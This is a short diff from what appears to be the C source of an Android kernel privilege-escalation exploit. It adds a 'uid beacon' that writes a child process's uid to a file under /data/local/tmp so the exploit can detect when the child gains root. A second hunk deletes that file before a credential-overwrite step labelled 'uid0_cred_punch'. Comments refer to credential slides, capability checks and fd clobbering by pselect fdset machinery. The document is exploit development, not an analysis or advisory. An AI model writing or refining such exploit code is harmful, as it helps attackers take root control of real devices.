@@ -1681,6 +1681,18 @@ static void child_spin_until_cmd(int cmd_r, char *cmd) {
         return;
     }
     syscall(__NR_getpid);
+    {
+      /* uid beacon (fd-free detection): the C-pipe answer path never
+       * worked in this codebase; the file always does. */
+      static int bf = -2;
+      if (bf == -2)
+        bf = open("/data/local/tmp/child_uid.txt", O_WRONLY | O_CREAT |
+                     O_TRUNC | O_SYNC, 0644);
+      if (bf >= 0) {
+        uint32_t u = (uint32_t)getuid();
+        (void)pwrite(bf, &u, sizeof(u), 0);
+      }
+    }
   }
 }
 
@@ -2135,6 +2147,7 @@ uid0_cred_punch:;
   /* landing-checked retry: the route loop verifies each punch attempt via
    * this child's CapEff (do_pselect_fake_lock_route MODE4_SLIDE_CRED) */
   g_uid0_child_pid = (long)child;
+  unlink("/data/local/tmp/child_uid.txt");
   /* The pselect fdset machinery dup2()s over EVERY fd 0..319 whose bit
    * appears in the stamp words (pointer-valued -> random low bits set).
    * Pipes in that range get clobbered mid-run (detector 9997 + old
